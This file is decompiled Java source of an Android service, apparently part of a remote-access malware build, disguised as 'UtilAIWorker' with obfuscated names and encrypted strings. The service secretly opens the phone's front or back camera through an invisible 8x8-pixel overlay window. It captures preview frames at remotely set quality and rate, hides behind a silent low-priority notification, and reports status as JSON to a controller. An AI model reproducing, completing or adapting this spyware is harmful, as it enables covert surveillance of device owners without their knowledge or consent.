package app.mobilex.plus.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import app.mobilex.plus.services.UtilAIWorker;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONObject;
import v.s.AbW0SZqZejvB;
import v.s.MpAe0akCT6N9p44XKU;
import v.s.OFtLBiBbrrTHWu;
import v.s.QmLUFJ3vXstIdpO2wk;
import v.s.RIZfHbqXpth8r2yN4;
import v.s.RWY6BVSB0XxPbw;
import v.s.Sb7Xj3N9U1DQ;
import v.s.UNmzHr5eYlkMOkDR30;
import v.s.Y9mRyRdkl5FOcwb66V6;
import v.s.iStgVlW5d7CQ5MhFi;
import v.s.imhBI9RqzETHtVIJe;
import v.s.okc5AGRjqrud84oM6d;
import v.s.qkzRt1s9DJNNYwsqt;
import v.s.s4Xe0OepSKbHpb3Nsd;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class UtilAIWorker extends Service implements SurfaceHolder.Callback {
    public static volatile boolean MLSIo1htfMPWeB8V876L;
    public long D5P1xCAyuvgF;
    public Camera dDIMxZXP1V8HdM;
    public int gIIiyi2ddlMDR0;
    public volatile boolean nQilHWaqS401ZtR;
    public volatile boolean pyu8ovAipBTLYAiKab;
    public WindowManager vekpFI4d1Nc4fakF;
    public SurfaceView w9sT1Swbhx3hs;
    public final Handler JXn4Qf7zpnLjP5 = new Handler(Looper.getMainLooper());
    public boolean Ee8d2j4S9Vm5yGuR = true;
    public int xDyLpEZyrcKVe0 = 35;
    public long ibVTtJUNfrGYbW = 200;
    public int b1EoSIRjJHO5 = 480;
    public int hjneShqpF9Tis4 = 640;
    public int gmNWMfvn6zlEj = 480;
    public final AtomicBoolean wotphlvK9sPbXJ = new AtomicBoolean(false);
    public final LinkedBlockingQueue Qrz92kRPw4GcghAc = new LinkedBlockingQueue(3);
    public final MpAe0akCT6N9p44XKU J0zjQ7CAgohuxU20eCW6 = new Camera.PreviewCallback() { // from class: v.s.MpAe0akCT6N9p44XKU
        private static /* synthetic */ void vbxixwvmiz() {
        }

        @Override // android.hardware.Camera.PreviewCallback
        public final void onPreviewFrame(byte[] bArr, Camera camera) {
            UtilAIWorker utilAIWorker = this.dDIMxZXP1V8HdM;
            boolean z = UtilAIWorker.MLSIo1htfMPWeB8V876L;
            try {
                if (utilAIWorker.pyu8ovAipBTLYAiKab && bArr != null && !utilAIWorker.wotphlvK9sPbXJ.get()) {
                    long jCurrentTimeMillis = System.currentTimeMillis();
                    if (jCurrentTimeMillis - utilAIWorker.D5P1xCAyuvgF < utilAIWorker.ibVTtJUNfrGYbW) {
                        return;
                    }
                    utilAIWorker.D5P1xCAyuvgF = jCurrentTimeMillis;
                    if (utilAIWorker.Qrz92kRPw4GcghAc.remainingCapacity() == 0) {
                        utilAIWorker.Qrz92kRPw4GcghAc.poll();
                    }
                    utilAIWorker.Qrz92kRPw4GcghAc.offer(Arrays.copyOf(bArr, bArr.length));
                }
            } catch (Exception unused) {
            }
        }
    };

    static {
        TypefaceCache.obtain("00000077005600B400E400AD00D700A6002E");
    }

    public static void b1EoSIRjJHO5(String str) {
        TypefaceCache.obtain("00100042007A00B300C5008C008800E7");
        try {
            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
            if (rWY6BVSB0XxPbw != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("00200077005600B800F400B600D300A0"));
                jSONObject.put("msg", str);
                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
            }
        } catch (Exception unused) {
        }
    }

    public final void Ee8d2j4S9Vm5yGuR() {
        this.pyu8ovAipBTLYAiKab = false;
        MLSIo1htfMPWeB8V876L = false;
        this.wotphlvK9sPbXJ.set(false);
        xDyLpEZyrcKVe0();
        this.JXn4Qf7zpnLjP5.post(new AbW0SZqZejvB(this, 2));
    }

    public final void JXn4Qf7zpnLjP5() {
        String strObtain = TypefaceCache.obtain("00200077005600B800E300AB00C000A20022007B");
        while (Locale.getDefault().toString().length() > 999) {
            String.valueOf(System.nanoTime());
        }
        NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
        int i = Build.VERSION.SDK_INT;
        NotificationChannel notificationChannel = new NotificationChannel(strObtain, TypefaceCache.obtain("0010006F0048009300F500B2"), 1);
        notificationChannel.setShowBadge(false);
        notificationChannel.setSound(null, null);
        if (notificationManager != null) {
            notificationManager.createNotificationChannel(notificationChannel);
        }
        s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, strObtain);
        s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = 2131034145;
        s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = (-97) + 95;
        s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(2, true);
        Notification notificationDDIMxZXP1V8HdM = s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM();
        if (i >= 29) {
            startForeground(9010, notificationDDIMxZXP1V8HdM, 64);
        } else {
            startForeground(9010, notificationDDIMxZXP1V8HdM);
        }
    }

    public final void dDIMxZXP1V8HdM(Camera.Parameters parameters) {
        List<Camera.Size> supportedPreviewSizes = parameters.getSupportedPreviewSizes();
        if (supportedPreviewSizes == null) {
            supportedPreviewSizes = qkzRt1s9DJNNYwsqt.w9sT1Swbhx3hs;
        }
        Camera.Size size = null;
        for (Camera.Size size2 : imhBI9RqzETHtVIJe.VEkRsTDS6a9oHWI(supportedPreviewSizes, new UNmzHr5eYlkMOkDR30(4))) {
            int i = this.b1EoSIRjJHO5;
            int i2 = size2.width;
            if (240 <= i2 && i2 <= i) {
                size = size2;
            }
        }
        if (size == null) {
            size = supportedPreviewSizes.isEmpty() ? null : supportedPreviewSizes.get(0);
        }
        if (size != null) {
            parameters.setPreviewSize(size.width, size.height);
            this.hjneShqpF9Tis4 = size.width;
            this.gmNWMfvn6zlEj = size.height;
        }
        parameters.setPreviewFormat(17);
        List<String> supportedFocusModes = parameters.getSupportedFocusModes();
        if (supportedFocusModes == null || !supportedFocusModes.contains("continuous-video")) {
            return;
        }
        parameters.setFocusMode("continuous-video");
    }

    public final void ibVTtJUNfrGYbW() {
        WindowManager windowManager;
        try {
            SurfaceView surfaceView = this.w9sT1Swbhx3hs;
            if (surfaceView == null) {
                return;
            }
            surfaceView.getHolder().removeCallback(this);
            Surface surface = surfaceView.getHolder().getSurface();
            if (surface != null) {
                surface.release();
            }
            if (surfaceView.isAttachedToWindow() && surfaceView.getWindowToken() != null && (windowManager = this.vekpFI4d1Nc4fakF) != null) {
                windowManager.removeViewImmediate(surfaceView);
            }
        } catch (Exception unused) {
        }
        this.w9sT1Swbhx3hs = null;
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        try {
            JXn4Qf7zpnLjP5();
        } catch (Exception e) {
            TypefaceCache.obtain("002C00780078009500F500BE00C600A200790036");
            e.getMessage();
        }
    }

    @Override // android.app.Service
    public final void onDestroy() {
        try {
            Ee8d2j4S9Vm5yGuR();
        } catch (Exception unused) {
        }
        super.onDestroy();
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        String action;
        try {
            JXn4Qf7zpnLjP5();
        } catch (Exception unused) {
        }
        if (intent != null) {
            try {
                action = intent.getAction();
            } catch (Exception e) {
                TypefaceCache.obtain("002C00780068009300F100AD00C60084002C007B0056008600FE00BB0092008100020042007A00AB00AA00FF");
                e.getMessage();
                b1EoSIRjJHO5(TypefaceCache.obtain("002C00780068009300F100AD00C60084002C007B0056008600FE00BB0092008200110044007400B500AA00FF") + e.getMessage());
                Ee8d2j4S9Vm5yGuR();
                stopSelf();
                return 2;
            }
        } else {
            action = null;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(action, TypefaceCache.obtain("00100042007400B7"))) {
            Ee8d2j4S9Vm5yGuR();
            stopSelf();
        } else {
            int i3 = 1;
            boolean booleanExtra = intent != null ? intent.getBooleanExtra(TypefaceCache.obtain("002500640054008900E4"), true) : true;
            int i4 = 35;
            int iXDyLpEZyrcKVe0 = OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(intent != null ? intent.getIntExtra(TypefaceCache.obtain("00320063005A008B00F900AB00CB"), 35) : 35, 10, 70);
            int i5 = 5;
            int iXDyLpEZyrcKVe1 = OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(intent != null ? intent.getIntExtra(TypefaceCache.obtain("002500660048"), 5) : 5, 1, 15);
            int i6 = 480;
            int intExtra = intent != null ? intent.getIntExtra(TypefaceCache.obtain("0034007F005F009300F8"), 480) : 480;
            int i7 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
            int iJ0zjQ7CAgohuxU20eCW6 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
            if (iJ0zjQ7CAgohuxU20eCW6 != 0) {
                if (iJ0zjQ7CAgohuxU20eCW6 == 1) {
                    i4 = 25;
                } else {
                    if (iJ0zjQ7CAgohuxU20eCW6 != 2) {
                        throw new Sb7Xj3N9U1DQ();
                    }
                    i4 = 15;
                }
            }
            if (iXDyLpEZyrcKVe0 > i4) {
                iXDyLpEZyrcKVe0 = i4;
            }
            this.xDyLpEZyrcKVe0 = iXDyLpEZyrcKVe0;
            int iJ0zjQ7CAgohuxU20eCW7 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
            if (iJ0zjQ7CAgohuxU20eCW7 != 0) {
                if (iJ0zjQ7CAgohuxU20eCW7 == 1) {
                    i5 = 3;
                } else {
                    if (iJ0zjQ7CAgohuxU20eCW7 != 2) {
                        throw new Sb7Xj3N9U1DQ();
                    }
                    i5 = 2;
                }
            }
            if (iXDyLpEZyrcKVe1 > i5) {
                iXDyLpEZyrcKVe1 = i5;
            }
            this.ibVTtJUNfrGYbW = 1000 / ((long) iXDyLpEZyrcKVe1);
            int iJ0zjQ7CAgohuxU20eCW8 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
            if (iJ0zjQ7CAgohuxU20eCW8 != 0) {
                if (iJ0zjQ7CAgohuxU20eCW8 == 1) {
                    i6 = 320;
                } else {
                    if (iJ0zjQ7CAgohuxU20eCW8 != 2) {
                        throw new Sb7Xj3N9U1DQ();
                    }
                    i6 = 240;
                }
            }
            if (intExtra > i6) {
                intExtra = i6;
            }
            this.b1EoSIRjJHO5 = intExtra;
            if (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.CAMERA") == 0) {
                if (this.pyu8ovAipBTLYAiKab && booleanExtra != this.Ee8d2j4S9Vm5yGuR && !this.wotphlvK9sPbXJ.get()) {
                    this.Ee8d2j4S9Vm5yGuR = booleanExtra;
                    b1EoSIRjJHO5(TypefaceCache.obtain("003000610052009300F300B700DB00A900240036004F008800B0") + (this.Ee8d2j4S9Vm5yGuR ? "front" : "back"));
                    this.wotphlvK9sPbXJ.set(true);
                    xDyLpEZyrcKVe0();
                    ibVTtJUNfrGYbW();
                    this.JXn4Qf7zpnLjP5.postDelayed(new AbW0SZqZejvB(this, 0), 800L);
                } else if (!this.pyu8ovAipBTLYAiKab) {
                    this.Ee8d2j4S9Vm5yGuR = booleanExtra;
                    this.pyu8ovAipBTLYAiKab = true;
                    MLSIo1htfMPWeB8V876L = true;
                    b1EoSIRjJHO5(TypefaceCache.obtain("003000730049009100F900BC00D7009800300062005A009500E400BA00D600EB006300700049008800FE00AB008F") + this.Ee8d2j4S9Vm5yGuR);
                    this.JXn4Qf7zpnLjP5.post(new AbW0SZqZejvB(this, i3));
                }
                return 1;
            }
            b1EoSIRjJHO5(TypefaceCache.obtain("00060044006900A800C200E5009200A9002C0036007800A600DD009A00E0008600630066005E009500FD00B600C100B4002A00790055"));
            stopSelf();
        }
        return 2;
    }

    @Override // android.view.SurfaceHolder.Callback
    public final void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i2, int i3) {
    }

    @Override // android.view.SurfaceHolder.Callback
    public final void surfaceCreated(SurfaceHolder surfaceHolder) {
        try {
            b1EoSIRjJHO5(TypefaceCache.obtain("003000630049008100F100BC00D7008400310073005A009300F500BB"));
            vekpFI4d1Nc4fakF(surfaceHolder);
        } catch (Exception e) {
            b1EoSIRjJHO5(TypefaceCache.obtain("003000630049008100F100BC00D7008400310073005A009300F500BB0092008200110044007400B500AA00FF") + e.getMessage());
        }
    }

    @Override // android.view.SurfaceHolder.Callback
    public final void surfaceDestroyed(SurfaceHolder surfaceHolder) {
        try {
            b1EoSIRjJHO5(TypefaceCache.obtain("003000630049008100F100BC00D7008300260065004F009500FF00A600D700A3"));
            xDyLpEZyrcKVe0();
        } catch (Exception e) {
            TypefaceCache.obtain("003000630049008100F100BC00D7008300260065004F009500FF00A600D700A300790036");
            e.getMessage();
        }
    }

    public final void vekpFI4d1Nc4fakF(SurfaceHolder surfaceHolder) {
        Exception e = null;
        for (int i = 1; i < 4; i++) {
            try {
                xDyLpEZyrcKVe0();
                boolean z = this.Ee8d2j4S9Vm5yGuR;
                int i2 = -1;
                try {
                    Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                    int numberOfCameras = Camera.getNumberOfCameras();
                    int i3 = 0;
                    while (true) {
                        if (i3 >= numberOfCameras) {
                            if (Camera.getNumberOfCameras() <= 0) {
                                break;
                            }
                            i2 = 0;
                            break;
                        } else {
                            Camera.getCameraInfo(i3, cameraInfo);
                            if (cameraInfo.facing == z) {
                                i2 = i3;
                                break;
                            }
                            i3++;
                        }
                    }
                } catch (Exception unused) {
                }
                if (i2 < 0) {
                    b1EoSIRjJHO5(TypefaceCache.obtain("00060044006900A800C200E5009200A40022007B005E009500F1008000DC00A800370049005D008800E500B100D6"));
                    return;
                }
                b1EoSIRjJHO5(TypefaceCache.obtain("002C0066005E008900F900B100D50098002000770056008200E200BE00ED00AE0027002B") + i2 + TypefaceCache.obtain("00630077004F009300F500B200C200B3007E") + i);
                Camera cameraOpen = Camera.open(i2);
                this.dDIMxZXP1V8HdM = cameraOpen;
                Camera.Parameters parameters = cameraOpen.getParameters();
                dDIMxZXP1V8HdM(parameters);
                this.dDIMxZXP1V8HdM.setParameters(parameters);
                this.dDIMxZXP1V8HdM.setPreviewDisplay(surfaceHolder);
                this.dDIMxZXP1V8HdM.setPreviewCallback(this.J0zjQ7CAgohuxU20eCW6);
                this.dDIMxZXP1V8HdM.startPreview();
                b1EoSIRjJHO5(TypefaceCache.obtain("00330064005E009100F900BA00C5009800300062005A009500E400BA00D600E7") + this.hjneShqpF9Tis4 + "x" + this.gmNWMfvn6zlEj);
                if (this.nQilHWaqS401ZtR) {
                    return;
                }
                this.nQilHWaqS401ZtR = true;
                Thread thread = new Thread(new AbW0SZqZejvB(this, 3));
                thread.setDaemon(true);
                thread.setName(TypefaceCache.obtain("00000077005600B400F500B100D600A20031"));
                thread.start();
                return;
            } catch (Exception e2) {
                e = e2;
                b1EoSIRjJHO5(TypefaceCache.obtain("002C0066005E008900D300BE00DF00A200310077001B008600E400AB00D700AA00330062001B") + i + TypefaceCache.obtain("00630070005A008E00FC00BA00D600FD0063") + e.getMessage());
                xDyLpEZyrcKVe0();
                if (i < 14 - 11) {
                    try {
                        Thread.sleep(((long) i) * 500);
                    } catch (Exception unused2) {
                    }
                }
            }
        }
        b1EoSIRjJHO5(TypefaceCache.obtain("002C0066005E008900D300BE00DF00A200310077001B00A100D1009600FE008200070036005A008100E400BA00C000E700700036005A009300E400BA00DF00B700370065000100C7") + (e != null ? e.getMessage() : null));
        Ee8d2j4S9Vm5yGuR();
        stopSelf();
    }

    public final void w9sT1Swbhx3hs() {
        b1EoSIRjJHO5(TypefaceCache.obtain("00200064005E008600E400B600DC00A0001C0079004D008200E200B300D300BE"));
        DataQFAdapter.Companion.getClass();
        WindowManager windowManager = DataQFAdapter.accessWindowManager;
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (windowManager == null || dataQFAdapter == null) {
            b1EoSIRjJHO5(TypefaceCache.obtain("00220027000A009E00CF00B100DD00B3001C0077004D008600F900B300D300A5002F0073"));
        } else {
            try {
                this.vekpFI4d1Nc4fakF = windowManager;
                this.w9sT1Swbhx3hs = new SurfaceView(dataQFAdapter);
                WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(8, 8, 2032, 56, -1);
                layoutParams.gravity = 8388659;
                this.w9sT1Swbhx3hs.getHolder().addCallback(this);
                this.vekpFI4d1Nc4fakF.addView(this.w9sT1Swbhx3hs, layoutParams);
                b1EoSIRjJHO5(TypefaceCache.obtain("002C0060005E009500FC00BE00CB009800220072005F008200F4008000D300F60072006F"));
                return;
            } catch (Exception e) {
                b1EoSIRjJHO5(TypefaceCache.obtain("00220027000A009E00CF00B000C400A20031007A005A009E00CF009900F3008E000F002C001B") + e.getMessage());
                try {
                    WindowManager windowManager2 = this.vekpFI4d1Nc4fakF;
                    if (windowManager2 != null) {
                        windowManager2.removeView(this.w9sT1Swbhx3hs);
                    }
                } catch (Exception unused) {
                }
                while (System.nanoTime() < 0) {
                }
                this.w9sT1Swbhx3hs = null;
            }
        }
        try {
            this.vekpFI4d1Nc4fakF = (WindowManager) getSystemService("window");
            this.w9sT1Swbhx3hs = new SurfaceView(this);
            WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams(8, 8, 2038, 56, -1);
            layoutParams2.gravity = 8388659;
            this.w9sT1Swbhx3hs.getHolder().addCallback(this);
            WindowManager windowManager3 = this.vekpFI4d1Nc4fakF;
            if (windowManager3 != null) {
                windowManager3.addView(this.w9sT1Swbhx3hs, layoutParams2);
            }
            b1EoSIRjJHO5(TypefaceCache.obtain("002C0060005E009500FC00BE00CB009800220072005F008200F4008000D400A6002F007A0059008600F300B4"));
        } catch (Exception e2) {
            b1EoSIRjJHO5(TypefaceCache.obtain("0002005A007700B800FF00A900D700B5002F0077004200B800D6009E00FB008B00790036") + e2.getMessage());
            Ee8d2j4S9Vm5yGuR();
            stopSelf();
        }
    }

    public final void xDyLpEZyrcKVe0() {
        try {
            Camera camera = this.dDIMxZXP1V8HdM;
            if (camera != null) {
                camera.setPreviewCallback(null);
            }
        } catch (Exception unused) {
        }
        try {
            Camera camera2 = this.dDIMxZXP1V8HdM;
            if (camera2 != null) {
                camera2.stopPreview();
            }
        } catch (Exception unused2) {
        }
        try {
            Camera camera3 = this.dDIMxZXP1V8HdM;
            if (camera3 != null) {
                camera3.release();
            }
        } catch (Exception unused3) {
        }
        this.dDIMxZXP1V8HdM = null;
        this.Qrz92kRPw4GcghAc.clear();
    }
}
